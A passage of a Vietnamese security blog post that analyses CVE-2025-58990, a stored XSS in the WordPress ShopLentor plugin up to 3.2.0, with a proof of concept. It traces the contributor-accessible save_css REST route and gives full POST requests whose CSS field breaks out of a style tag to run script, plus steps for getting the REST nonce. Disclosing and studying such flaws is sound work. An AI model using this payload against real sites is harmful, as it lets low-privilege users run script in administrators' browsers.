    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">wp_postmeta</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">meta_key</span><span class="o">=</span><span class="s1">&#39;_woolentor_css&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">---------+---------+----------------+------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">meta_id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">post_id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">meta_key</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="n">meta_value</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">---------+---------+----------------+------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">      </span><span class="mi">27</span><span class="w"> </span><span class="o">|</span><span class="w">      </span><span class="mi">69</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">_woolentor_css</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">body</span><span class="p">:</span><span class="err">{}</span><span class="w">    </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">     </span><span class="mi">687</span><span class="w"> </span><span class="o">|</span><span class="w">    </span><span class="mi">1416</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">_woolentor_css</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">body</span><span class="p">:</span><span class="err">{}</span><span class="w">    </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">---------+---------+----------------+------------+</span></span></span></code></pre></div></div>
<ul>
<li>Ghi CSS ra file trong thư mục upload (<code>woolentor-css-{post_id}.css</code>).</li>
</ul>
<p><figure><a class="lightgallery" href="/2025-10-05-cve-2025-58990/write_css.png" title="Write CSS" data-thumbnail="/2025-10-05-cve-2025-58990/write_css.png" data-sub-html="<h2>Write CSS</h2><p>Write CSS</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-05-cve-2025-58990/write_css.png"
            data-srcset="/2025-10-05-cve-2025-58990/write_css.png, /2025-10-05-cve-2025-58990/write_css.png 1.5x, /2025-10-05-cve-2025-58990/write_css.png 2x"
            data-sizes="auto"
            alt="/2025-10-05-cve-2025-58990/write_css.png" width="976" height="322" />
    </a><figcaption class="image-caption">Write CSS</figcaption>
    </figure></p>
</li>
<li>
<p>Nếu không có block (<code>has_block = false</code>):</p>
<ul>
<li>Xoá trạng thái active và CSS meta.</li>
<li>Xoá file CSS nếu tồn tại.</li>
</ul>
</li>
</ul>
<p>👉 Khả năng xảy ra là combo <strong>Stored XSS</strong> phổ biến trong plugin WordPress: user role <strong>contributor</strong> (không có quyền publish) tạo post có CSS chứa payload XSS. Payload này được lưu trong <strong>database</strong> hoặc một <strong>file</strong>; Người dùng có đặc quyền cao hơn sẽ preview (xem trước) nội dung trước khi publish, payload sẽ được tải/hiển thị trong trình duyệt và thực thi, gây ra XSS.</p>
<p>Để hiểu cách dữ liệu được hiển thị, ta tìm với từ khóa <code>_woolentor_css</code> trong thư mục plugin. Vì CSS được lưu trong <code>wp_postmeta</code> với <code>meta_key = _woolentor_css</code>, nên chắc chắn plugin sẽ truy vấn giá trị này và chèn trực tiếp vào HTML.</p>
<p><figure><a class="lightgallery" href="/2025-10-05-cve-2025-58990/meta_key.png" title="Search Meta Key" data-thumbnail="/2025-10-05-cve-2025-58990/meta_key.png" data-sub-html="<h2>Search Meta Key</h2><p>Search Meta Key</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-05-cve-2025-58990/meta_key.png"
            data-srcset="/2025-10-05-cve-2025-58990/meta_key.png, /2025-10-05-cve-2025-58990/meta_key.png 1.5x, /2025-10-05-cve-2025-58990/meta_key.png 2x"
            data-sizes="auto"
            alt="/2025-10-05-cve-2025-58990/meta_key.png" width="1588" height="762" />
    </a><figcaption class="image-caption">Search Meta Key</figcaption>
    </figure></p>
<p><code>generate_inline_css()</code> lấy block CSS từ <strong>wp_postmeta</strong> với <code>meta_key = _woolentor_css</code> và lấy từ file <code>woolentor-css-{$post_id}.css</code>, nếu file tồn tại thì <code>get_contents</code> và inline CSS cho post có <code>$post_id</code> được truyền vào, còn nếu file không tồn tại thì lấy từ <strong>wp_postmeta</strong>.</p>
<p>Nội dung được đặt trong thẻ <code>&lt;style type=&quot;text/css&quot;&gt;&lt;/style&gt;</code></p>
<hr>
<p>class <code>Manage_Styles</code> đăng ký <strong>REST API</strong> trong hàm <code>register_routes</code></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">register_routes</span><span class="p">(</span> <span class="nv">$namespace</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">register_rest_route</span><span class="p">(</span> <span class="nv">$namespace</span><span class="p">,</span> <span class="s1">&#39;save_css&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="p">[</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;methods&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;callback&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;save_block_css&#39;</span> <span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;permission_callback&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="nv">$this</span><span class="p">,</span> <span class="s1">&#39;permission_check&#39;</span> <span class="p">],</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;args&#39;</span> <span class="o">=&gt;</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">            <span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// other route
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></div></div>
<p>Hàm <code>register_rest_route()</code> tạo một <strong>REST API</strong> endpoint tại đường dẫn:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>/wp-json/{namespace}/save_css</code></pre></div>
<p>Khi có request <strong>POST</strong> tới endpoint này:</p>
<ul>
<li>WordPress sẽ gọi hàm <code>save_block_css()</code> để xử lý dữ liệu.</li>
<li>Trước đó, <code>permission_callback</code> sẽ chạy hàm <code>permission_check()</code> để kiểm tra quyền của user (nếu trả về false thì chặn request).</li>
</ul>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">permission_check</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="nx">current_user_can</span><span class="p">(</span> <span class="s1">&#39;edit_posts&#39;</span> <span class="p">)</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Hàm <code>permission_check</code> quy định rằng chỉ những user có quyền <strong>contributor</strong> trở lên mới được phép sử dụng API này.</p>
<p>Ta chưa xác định được chính xác <strong>namespace</strong> ở đây là gì vì nó được khai báo ở đâu đó trong mã nguồn, không phải trong class này. Ta tận dụng route <code>save_css</code> để truy vết.</p>
<p>Truy cập <code>/wp-json/</code> và tìm với từ khóa <code>save_css</code></p>
<p><figure><a class="lightgallery" href="/2025-10-05-cve-2025-58990/search.png" title="Search" data-thumbnail="/2025-10-05-cve-2025-58990/search.png" data-sub-html="<h2>Search</h2><p>Search</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-05-cve-2025-58990/search.png"
            data-srcset="/2025-10-05-cve-2025-58990/search.png, /2025-10-05-cve-2025-58990/search.png 1.5x, /2025-10-05-cve-2025-58990/search.png 2x"
            data-sizes="auto"
            alt="/2025-10-05-cve-2025-58990/search.png" width="1557" height="451" />
    </a><figcaption class="image-caption">Search</figcaption>
    </figure></p>
<p>Kết quả cho thấy endpoint thực tế là:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">http://localhost/wp-json/woolentor/v1/save_css</span></span></span></code></pre></div></div>
<p>Để biết <strong>namespace</strong> này được khai báo ở đâu, ta tiếp tục tìm trong mã nguồn với từ khóa <code>'woolentor/v1'</code>:</p>
<p><figure><a class="lightgallery" href="/2025-10-05-cve-2025-58990/name_space.png" title="Name Space" data-thumbnail="/2025-10-05-cve-2025-58990/name_space.png" data-sub-html="<h2>Name Space</h2><p>Name Space</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-05-cve-2025-58990/name_space.png"
            data-srcset="/2025-10-05-cve-2025-58990/name_space.png, /2025-10-05-cve-2025-58990/name_space.png 1.5x, /2025-10-05-cve-2025-58990/name_space.png 2x"
            data-sizes="auto"
            alt="/2025-10-05-cve-2025-58990/name_space.png" width="895" height="423" />
    </a><figcaption class="image-caption">Name Space</figcaption>
    </figure></p>
<p>Có nhiều kết quả, nhưng vì ta đang phân tích tính năng <strong>REST API</strong>, nên tập trung vào file <strong>Api.php</strong>.</p>
<p><code>register_routes( $namespace )</code> thuộc class <code>Manage_Styles</code> yêu cầu tham số <code>$namespace</code> nên có thể <code>woolentor/v1</code> được truyền ở đây thông qua thể hiện của class gọi đến hàm. ta tìm với từ khóa <code>Manage_Styles</code> trong file <strong>Api.php</strong> để biết nó được gọi như vậy không.</p>
<p><figure><a class="lightgallery" href="/2025-10-05-cve-2025-58990/callapi.png" title="Call Api" data-thumbnail="/2025-10-05-cve-2025-58990/callapi.png" data-sub-html="<h2>Call Api</h2><p>Call Api</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-05-cve-2025-58990/callapi.png"
            data-srcset="/2025-10-05-cve-2025-58990/callapi.png, /2025-10-05-cve-2025-58990/callapi.png 1.5x, /2025-10-05-cve-2025-58990/callapi.png 2x"
            data-sizes="auto"
            alt="/2025-10-05-cve-2025-58990/callapi.png" width="1509" height="337" />
    </a><figcaption class="image-caption">Call Api</figcaption>
    </figure></p>
<p><code>namespace</code> chính xác được gọi và truyền như vậy.</p>
<p>👉 Như vậy, khi gửi <strong>POST</strong> request đến endpoint <code>http://localhost/wp-json/woolentor/v1/save_css</code>, callback <code>save_block_css</code> được gọi để thêm/sửa block CSS trong file và database.
Khi truy cập vào post có <code>post_id</code> liên quan đến block CSS được lưu, <code>generate_inline_css</code> sẽ lấy nội block CSS và inline CSS trong thẻ <code>&lt;style type=&quot;text/css&quot;&gt;&lt;/style&gt;</code> của post.</p>
<hr>
<h2 id="exploit">Exploit</h2>
<h3 id="detect-xss">Detect XSS</h3>
<p>Sử dụng user có role <strong>contributor</strong> tạo 1 post bất kì, ghi nhớ id của post đó.</p>
<p>Gửi <strong>POST</strong> request đến endpoint <code>http://localhost/wp-json/woolentor/v1/save_css</code> với XSS payload</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-json/woolentor/v1/save_css</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;post_id&#34;</span><span class="p">:</span><span class="mi">1416</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;has_block&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;block_css&#34;</span><span class="p">:</span><span class="s2">&#34;&lt;/style&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;style&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p><strong>Response</strong></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-json">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;code&#34;</span><span class="p">:</span><span class="s2">&#34;rest_forbidden&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;message&#34;</span><span class="p">:</span><span class="s2">&#34;Sorry, you are not allowed to do that.&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;data&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&#34;status&#34;</span><span class="p">:</span><span class="mi">401</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>👉 Thiếu header <strong>X-WP-Nonce</strong> để phân quyền người dùng. Ta mở source HTML (<kbd>Ctrl</kbd>+<kbd>U</kbd>) trang chỉnh sửa bài viết:</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><pre tabindex="0"><code>view-source:http://localhost/wp-admin/post.php?post=&lt;post_id&gt;&amp;action=edit</code></pre></div>
<p>Tìm <code>wpApiSettings</code> trong source và lấy giá trị <code>nonce</code></p>
<p><figure><a class="lightgallery" href="/2025-10-05-cve-2025-58990/api_search.png" title="wpApiSettings" data-thumbnail="/2025-10-05-cve-2025-58990/api_search.png" data-sub-html="<h2>wpApiSettings</h2><p>wpApiSettings</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-05-cve-2025-58990/api_search.png"
            data-srcset="/2025-10-05-cve-2025-58990/api_search.png, /2025-10-05-cve-2025-58990/api_search.png 1.5x, /2025-10-05-cve-2025-58990/api_search.png 2x"
            data-sizes="auto"
            alt="/2025-10-05-cve-2025-58990/api_search.png" width="1917" height="245" />
    </a><figcaption class="image-caption">wpApiSettings</figcaption>
    </figure></p>
<p>Gửi request với <strong>X-WP-Nonce</strong> có giá trị vừa lấy được</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-http">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wp-json/woolentor/v1/save_css</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">X-WP-Nonce</span><span class="o">:</span> <span class="l">f79ec79e4b</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;post_id&#34;</span><span class="p">:</span><span class="mi">1416</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;has_block&#34;</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nt">&#34;block_css&#34;</span><span class="p">:</span><span class="s2">&#34;&lt;/style&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;style&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p><strong>Preview post</strong></p>
<p><figure><a class="lightgallery" href="/2025-10-05-cve-2025-58990/preview.png" title="Preview" data-thumbnail="/2025-10-05-cve-2025-58990/preview.png" data-sub-html="<h2>Preview</h2><p>Preview</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-05-cve-2025-58990/preview.png"
            data-srcset="/2025-10-05-cve-2025-58990/preview.png, /2025-10-05-cve-2025-58990/preview.png 1.5x, /2025-10-05-cve-2025-58990/preview.png 2x"
            data-sizes="auto"
            alt="/2025-10-05-cve-2025-58990/preview.png" width="1266" height="467" />
    </a><figcaption class="image-caption">Preview</figcaption>
    </figure></p>
<p>👉 XSS thành công, <strong>inspect</strong> để xem code được thay đổi như nào</p>
<p><strong>View source code</strong></p>
<p><figure><a class="lightgallery" href="/2025-10-05-cve-2025-58990/code.png" title="Code" data-thumbnail="/2025-10-05-cve-2025-58990/code.png" data-sub-html="<h2>Code</h2><p>Code</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-10-05-cve-2025-58990/code.png"
            data-srcset="/2025-10-05-cve-2025-58990/code.png, /2025-10-05-cve-2025-58990/code.png 1.5x, /2025-10-05-cve-2025-58990/code.png 2x"
            data-sizes="auto"
            alt="/2025-10-05-cve-2025-58990/code.png" width="728" height="285" />
    </a><figcaption class="image-caption">Code</figcaption>
    </figure></p>
<hr>
<h2 id="conclusion">Conclusion</h2>
<p>Lỗ hổng <strong>CVE-2025-58990</strong> trong plugin <strong>ShopLentor &lt;= 3.2.0</strong> cho phép <strong>contributor</strong> chèn CSS độc hại dẫn đến Stored XSS khi admin/author preview hoặc xem post. Bản vá <strong>3.2.1</strong> bổ sung kiểm tra quyền và sanitize CSS, ngăn chặn khai thác.</p>
<p><strong>Key takeaways</strong>:</p>
<ul>
<li>Luôn kết hợp <strong>kiểm tra quyền</strong> và <strong>sanitize</strong> dữ liệu khi xử lý input từ người dùng.</li>
<li>Các role thấp (như <strong>contributor</strong>) vẫn có thể trở thành điểm tấn công nếu API không bảo vệ đúng cách.</li>
<li><strong>Stored XSS</strong> trong WordPress thường xuất hiện khi dữ liệu được lưu DB/file =&gt; render inline mà không lọc.</li>
<li>Việc cập nhật plugin kịp thời là biện pháp phòng thủ đơn giản nhưng hiệu quả nhất.</li>
</ul>
<hr>
<h2 id="references">References</h2>
<p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener noreffer ">Cross-site scripting (XSS) cheat sheet</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/ShopLentor/vulnerability/wordpress-ShopLentor-plugin-1-0-5-cross-site-scripting-xss-vulnerability" target="_blank" rel="noopener noreffer "> WordPress ShopLentor Plugin &lt;= 3.2.0 is vulnerable to Cross Site Scripting (XSS) </a></p>
<hr>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Cập nhật ngày 2025-10-05</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/vi/2025-10-05-cve-2025-58990/index.md" target="_blank">Đọc với định dạng Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="x" data-url="http://localhost:1313/vi/2025-10-05-cve-2025-58990/" data-title="CVE-2025-58990 Analysis &amp; POC" data-hashtags="analyst,plugin,xss"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Threads" data-sharer="threads" data-url="http://localhost:1313/vi/2025-10-05-cve-2025-58990/" data-title="CVE-2025-58990 Analysis &amp; POC"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/2025-10-05-cve-2025-58990/" data-hashtag="analyst"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/2025-10-05-cve-2025-58990/" data-title="CVE-2025-58990 Analysis &amp; POC"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Line" data-sharer="line" data-url="http://localhost:1313/vi/2025-10-05-cve-2025-58990/" data-title="CVE-2025-58990 Analysis &amp; POC"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên 微博" data-sharer="weibo" data-url="http://localhost:1313/vi/2025-10-05-cve-2025-58990/" data-title="CVE-2025-58990 Analysis &amp; POC" data-image="app.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Chia sẻ trên Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/vi/2025-10-05-cve-2025-58990/" data-title="CVE-2025-58990 Analysis &amp; POC" data-description="Security Vulnerability in WordPress ShopLentor Plugin."><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fvi%2f2025-10-05-cve-2025-58990%2f&amp;text=CVE-2025-58990%20Analysis%20%26%20POC" target="_blank" title="Chia sẻ trên Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/vi/tags/analyst/">Analyst</a>,&nbsp;<a href="/vi/tags/plugin/">Plugin</a>,&nbsp;<a href="/vi/tags/xss/">Xss</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Quay lại</a></span>&nbsp;|&nbsp;<span><a href="/vi/">Trang chủ</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/vi/2025-10-04-cve-2025-27006/" class="prev" rel="prev" title="CVE-2025-27006 Analysis &amp; POC"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>CVE-2025-27006 Analysis & POC</a>
            <a href="/vi/2025-10-06-cve-2025-10146/" class="next" rel="next" title="CVE-2025-10146 Analysis &amp; POC">CVE-2025-10146 Analysis & POC<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://w41bu1.github.io" target="_blank">w41bu1</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Lên trên">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a>
        </div>

        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="Xem bình luận">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/algoliasearch/lite/browser.umd.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"algoliaAppID":"GZT24PWKNT","algoliaIndex":"index","algoliaSearchKey":"634ab679e825b815de2663de38908f9d","highlightTag":"em","maxResultLength":10,"noResultsFound":"Không tìm thấy","snippetLength":50,"type":"algolia"}};</script><script src="/js/theme.min.js"></script></body>
</html>
